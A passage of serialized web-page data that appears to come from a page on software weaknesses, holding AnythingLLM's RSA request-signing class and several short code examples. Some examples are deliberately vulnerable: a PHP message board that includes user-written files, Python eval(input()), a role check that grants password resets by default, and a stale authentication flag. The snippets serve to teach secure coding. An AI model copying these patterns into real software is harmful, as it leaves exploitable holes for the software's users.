    <span class="token keyword">return</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#pubKeyName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// Given a signed payload from private key from /app/server/ this signature should</span>
  <span class="token comment">// decode to match the textData provided. This class does verification only in collector.</span>
  <span class="token comment">// Note: The textData is typically the JSON stringified body sent to the document processor API.</span>
  <span class="token function">verify</span><span class="token punctuation">(</span>signature <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> textData <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> data <span class="token operator">=</span> textData<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> textData <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>
        <span class="token string">"RSA-SHA256"</span><span class="token punctuation">,</span>
        Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#readPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>signature<span class="token punctuation">,</span> <span class="token string">"hex"</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> CommunicationKey <span class="token punctuation">}</span><span class="token punctuation">;</span>
37:Tad0,const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const keyPath =
  process.env.NODE_ENV === "development"
    ? path.resolve(__dirname, `../../storage/comkey`)
    : path.resolve(process.env.STORAGE_DIR, `comkey`);

// What does this class do?
// This class generates a hashed version of some text (typically a JSON payload) using a rolling RSA key
// that can then be appended as a header value to do integrity checking on a payload. Given the
// nature of this class and that keys are rolled constantly, this protects the request
// integrity of requests sent to the collector as only the server can sign these requests.
// This keeps accidental misconfigurations of AnythingLLM that leaving port 8888 open from
// being abused or SSRF'd by users scraping malicious sites who have a loopback embedded in a <script>, for example.
// Since each request to the collector must be signed to be valid, unsigned requests directly to the collector
// will be dropped and must go through the /server endpoint directly.
class CommunicationKey {
  #privKeyName = "ipc-priv.pem";
  #pubKeyName = "ipc-pub.pem";
  #storageLoc = keyPath;

  // Init the class and determine if keys should be rolled.
  // This typically occurs on boot up so key is fresh each boot.
  constructor(generate = false) {
    if (generate) this.#generate();
  }

  log(text, ...args) {
    console.log(`\x1b[36m[CommunicationKey]\x1b[0m ${text}`, ...args);
  }

  #readPrivateKey() {
    return fs.readFileSync(path.resolve(this.#storageLoc, this.#privKeyName));
  }

  #generate() {
    const keyPair = crypto.generateKeyPairSync("rsa", {
      modulusLength: 2048,
      publicKeyEncoding: {
        type: "pkcs1",
        format: "pem",
      },
      privateKeyEncoding: {
        type: "pkcs1",
        format: "pem",
      },
    });

    if (!fs.existsSync(this.#storageLoc))
      fs.mkdirSync(this.#storageLoc, { recursive: true });
    fs.writeFileSync(
      `${path.resolve(this.#storageLoc, this.#privKeyName)}`,
      keyPair.privateKey
    );
    fs.writeFileSync(
      `${path.resolve(this.#storageLoc, this.#pubKeyName)}`,
      keyPair.publicKey
    );
    this.log(
      "RSA key pair generated for signed payloads within AnythingLLM services."
    );
  }

  // This instance of ComKey on server is intended for generation of Priv/Pub key for signing and decoding.
  // this resource is shared with /collector/ via a class of the same name in /utils which does decoding/verification only
  // while this server class only does signing with the private key.
  sign(textData = "") {
    return crypto
      .sign("RSA-SHA256", Buffer.from(textData), this.#readPrivateKey())
      .toString("hex");
  }
}

module.exports = { CommunicationKey };
38:T377e,<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> keyPath <span class="token operator">=</span>
  process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"development"</span>
    <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">../../storage/comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">STORAGE_DIR</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// What does this class do?</span>
<span class="token comment">// This class generates a hashed version of some text (typically a JSON payload) using a rolling RSA key</span>
<span class="token comment">// that can then be appended as a header value to do integrity checking on a payload. Given the</span>
<span class="token comment">// nature of this class and that keys are rolled constantly, this protects the request</span>
<span class="token comment">// integrity of requests sent to the collector as only the server can sign these requests.</span>
<span class="token comment">// This keeps accidental misconfigurations of AnythingLLM that leaving port 8888 open from</span>
<span class="token comment">// being abused or SSRF'd by users scraping malicious sites who have a loopback embedded in a &lt;script>, for example.</span>
<span class="token comment">// Since each request to the collector must be signed to be valid, unsigned requests directly to the collector</span>
<span class="token comment">// will be dropped and must go through the /server endpoint directly.</span>
<span class="token keyword">class</span> <span class="token class-name">CommunicationKey</span> <span class="token punctuation">{</span>
  #privKeyName <span class="token operator">=</span> <span class="token string">"ipc-priv.pem"</span><span class="token punctuation">;</span>
  #pubKeyName <span class="token operator">=</span> <span class="token string">"ipc-pub.pem"</span><span class="token punctuation">;</span>
  #storageLoc <span class="token operator">=</span> keyPath<span class="token punctuation">;</span>

  <span class="token comment">// Init the class and determine if keys should be rolled.</span>
  <span class="token comment">// This typically occurs on boot up so key is fresh each boot.</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">generate <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>generate<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">log</span><span class="token punctuation">(</span><span class="token parameter">text<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\x1b[36m[CommunicationKey]\x1b[0m </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>text<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">#readPrivateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#privKeyName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">#generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> keyPair <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">generateKeyPairSync</span><span class="token punctuation">(</span><span class="token string">"rsa"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">modulusLength</span><span class="token operator">:</span> <span class="token number">2048</span><span class="token punctuation">,</span>
      <span class="token literal-property property">publicKeyEncoding</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"pkcs1"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">format</span><span class="token operator">:</span> <span class="token string">"pem"</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">privateKeyEncoding</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"pkcs1"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">format</span><span class="token operator">:</span> <span class="token string">"pem"</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">)</span><span class="token punctuation">)</span>
      fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>
      <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#privKeyName<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
      keyPair<span class="token punctuation">.</span>privateKey
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>
      <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#pubKeyName<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
      keyPair<span class="token punctuation">.</span>publicKey
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
      <span class="token string">"RSA key pair generated for signed payloads within AnythingLLM services."</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// This instance of ComKey on server is intended for generation of Priv/Pub key for signing and decoding.</span>
  <span class="token comment">// this resource is shared with /collector/ via a class of the same name in /utils which does decoding/verification only</span>
  <span class="token comment">// while this server class only does signing with the private key.</span>
  <span class="token function">sign</span><span class="token punctuation">(</span>textData <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> crypto
      <span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token string">"RSA-SHA256"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>textData<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#readPrivateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> CommunicationKey <span class="token punctuation">}</span><span class="token punctuation">;</span>
39:Te8f,<span class="token keyword">private</span> <span class="token keyword">boolean</span> isUserAuthentic <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">authenticateUser</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">// authenticate user,</span>
    <span class="token comment">// if user is authenticated then set variable to true</span>
    <span class="token comment">// otherwise set variable to false</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token class-name">BankAccount</span> <span class="token function">createNewBankAccount</span><span class="token punctuation">(</span><span class="token class-name">String</span> accountNumber<span class="token punctuation">,</span> <span class="token class-name">String</span> accountType<span class="token punctuation">,</span> <span class="token class-name">String</span> accountName<span class="token punctuation">,</span> <span class="token class-name">String</span> accountSSN<span class="token punctuation">,</span> <span class="token keyword">double</span> balance<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">BankAccount</span> account <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>isUserAuthentic<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        account <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BankAccount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountNumber</span><span class="token punctuation">(</span>accountNumber<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountType</span><span class="token punctuation">(</span>accountType<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountOwnerName</span><span class="token punctuation">(</span>accountName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountOwnerSSN</span><span class="token punctuation">(</span>accountSSN<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setBalance</span><span class="token punctuation">(</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> account<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
3a:T9cd,<span class="token variable">$transfer_amount</span> <span class="token operator">=</span> GetTransferAmount<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$balance</span> <span class="token operator">=</span> GetBalanceFromDatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$transfer_amount</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FatalError<span class="token punctuation">(</span><span class="token string">"Bad Transfer Amount"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$newbalance</span> <span class="token operator">=</span> <span class="token variable">$balance</span> <span class="token operator">-</span> <span class="token variable">$transfer_amount</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$balance</span> <span class="token operator">-</span> <span class="token variable">$transfer_amount</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FatalError<span class="token punctuation">(</span><span class="token string">"Insufficient Funds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
SendNewBalanceToDatabase<span class="token punctuation">(</span><span class="token variable">$newbalance</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
NotifyUser<span class="token punctuation">(</span><span class="token string">"Transfer of $transfer_amount succeeded."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
NotifyUser<span class="token punctuation">(</span><span class="token string">"New balance: $newbalance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
3b:T4e6,<span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token class-name">pthread_mutex_t</span> <span class="token operator">*</span>mutex<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> result<span class="token punctuation">;</span>

    result <span class="token operator">=</span> <span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">!=</span> result<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>

    <span class="token comment">/* access shared resource */</span>

    <span class="token keyword">return</span> <span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
3c:T719,<span class="token keyword">def</span> <span class="token function">makeNewUserDir</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> invalidUsername<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#avoid CWE-22 and CWE-78</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Usernames cannot contain invalid characters'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        raisePrivileges<span class="token punctuation">(</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'/home/'</span> <span class="token operator">+</span> username<span class="token punctuation">)</span>
        lowerPrivileges<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Unable to create new user directory for user:'</span> <span class="token operator">+</span> username<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span>
3d:Tee9,<span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Roles</span>
<span class="token punctuation">{</span>
    <span class="token constant">ADMIN</span><span class="token punctuation">,</span><span class="token constant">OPERATOR</span><span class="token punctuation">,</span><span class="token constant">USER</span><span class="token punctuation">,</span><span class="token constant">GUEST</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">resetPassword</span><span class="token punctuation">(</span><span class="token class-name">User</span> requestingUser<span class="token punctuation">,</span> <span class="token class-name">User</span> user<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isAuthenticated</span><span class="token punctuation">(</span>requestingUser<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>requestingUser<span class="token punctuation">.</span>role<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token constant">GUEST</span><span class="token operator">:</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You are not authorized to perform this command"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        <span class="token keyword">case</span> <span class="token constant">USER</span><span class="token operator">:</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You are not authorized to perform this command"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        <span class="token keyword">default</span><span class="token operator">:</span>
            <span class="token function">setPassword</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You must be logged in to perform this command"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
3e:T1266,<span class="token comment">/* Create pid file before we drop privileges */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pidfile_create</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">fprintf</span> <span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s: Could not create PID file.\n"</span><span class="token punctuation">,</span>
                         argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span> <span class="token punctuation">(</span>EX_OSERR<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">/* Switch to a different user if we're running as root */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">geteuid</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">change_user</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
        <span class="token function">log_message</span> <span class="token punctuation">(</span>LOG_WARNING<span class="token punctuation">,</span>
                     <span class="token string">"Not running as root, so not changing UID/GID."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* Create log file after we drop privileges */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setup_logging</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span> <span class="token punctuation">(</span>EX_SOFTWARE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* Create pid file after we drop privileges */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pidfile_create</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">fprintf</span> <span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s: Could not create PID file.\n"</span><span class="token punctuation">,</span>
                         argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span> <span class="token punctuation">(</span>EX_OSERR<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

3f:Td05,<span class="token variable">$MessageFile</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"messages.out"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"NewMessage"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$MessageFile</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;b><span class="token interpolation"><span class="token variable">$name</span></span>&lt;/b> says '<span class="token interpolation"><span class="token variable">$message</span></span>'&lt;hr>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Message Saved!&lt;p>\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"ViewMessages"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$MessageFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
40:T66b,<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>
    numbers <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter a space-separated list of numbers: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> num <span class="token keyword">in</span> numbers<span class="token punctuation">:</span>
        <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token builtin">sum</span> <span class="token operator">+</span> num
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Sum of </span><span class="token interpolation"><span class="token punctuation">{</span>numbers<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">sum</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span>
41:T720,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$cats</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token number">0</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token string single-quoted-string">'name'</span><span class="token operator">=></span><span class="token string single-quoted-string">'未分组'</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'status'</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'orders'</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'id'</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">7</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
